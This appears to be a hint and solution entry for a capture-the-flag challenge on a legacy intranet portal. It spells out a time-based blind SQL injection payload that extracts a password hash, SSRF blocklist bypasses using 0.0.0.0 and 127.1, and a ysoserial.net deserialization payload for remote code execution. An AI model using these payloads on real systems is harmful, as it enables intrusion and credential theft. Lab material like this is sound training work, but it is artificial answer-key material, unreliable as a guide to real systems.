tier1: This legacy intranet portal has three vulnerability classes: a blind time-based SQL injection in the user search endpoint (the [ValidateInput(true)] attribute blocks HTML/script tags but does nothing for SQLi), a blind SSRF in the link preview tool with a blocklist that can be bypassed to reach an internal admin endpoint, and an unsafe object instantiation RCE in the admin import wizard that uses TypeNameHandling.All.
tier2: SQLi bypass: GET /Users/Search?q=' AND 1=(SELECT CASE WHEN (substr(PasswordHash,1,1)='2') THEN 1 ELSE (SELECT 1 FROM (SELECT randomblob(300000000))) END)-- - — use timing differences to exfiltrate the admin password hash character by character, then crack it (SHA256) and login as admin to get FLAG_LOCAL. SSRF bypass: POST /Tools/Preview with url=http://0.0.0.0:5000/internal/admin or url=http://127.1/internal/admin — the blocklist checks for 'localhost', '127.0.0.1', '::1' but not these aliases; the internal endpoint returns admin credentials (admin/admin123), login to get FLAG_LOCAL. RCE: POST /Admin/Import with a base64-encoded ysoserial.net gadget payload ($type pointing to a gadget chain) — the size check (10000 chars) and base64 prefix check ('ew') are both easily satisfied; TypeNameHandling.All enables arbitrary type instantiation and RCE to read /flag_proof.txt.
